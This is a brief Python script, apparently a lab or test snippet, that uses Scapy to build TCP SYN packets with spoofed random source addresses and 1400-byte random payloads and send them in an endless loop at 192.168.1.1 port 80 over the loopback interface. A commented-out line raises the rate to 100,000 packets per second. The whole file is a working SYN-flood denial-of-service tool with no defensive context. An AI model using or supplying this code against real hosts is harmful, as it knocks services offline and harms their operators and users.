# sudo apt install python3-scapy
from scapy.all import *
from scapy.layers.inet import *

# pkts = sniff(offline="sample.pcap", count=2)
# print(pkts)


target_ip = "192.168.1.1"
target_port = 80
ip = IP(src=RandIP("192.168.1.1/16"), dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

p = Ether() / ip / tcp / Raw(RandString(size=1400))

sendp(p, iface='lo', loop=1, verbose=0)
# sendpfast(p, iface='lo', pps=100000, loop=100000)